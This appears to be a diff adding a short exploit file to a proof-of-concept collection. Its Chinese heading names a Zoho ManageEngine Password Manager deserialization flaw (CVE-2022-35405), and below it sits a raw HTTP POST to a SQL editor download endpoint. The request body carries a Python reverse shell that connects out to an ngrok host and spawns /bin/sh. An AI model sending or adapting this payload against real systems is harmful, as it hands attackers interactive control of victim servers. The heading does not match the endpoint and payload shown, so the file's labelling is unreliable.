@@ -1,0 +1,7 @@
+# Zoho ManageEngine PasswordManager XML反序列化漏洞(CVE-2022-35405)
+POST /sqleditor/query_tool/download/9907078 HTTP/1.1
+Host: www.xwd_test.com
+Content-Type: application/json
+Content-Length: 268
+
+{"query": "SELECT 1;","query_commited": "exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('0.tcp.jp.ngrok.io',17477));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])')"}
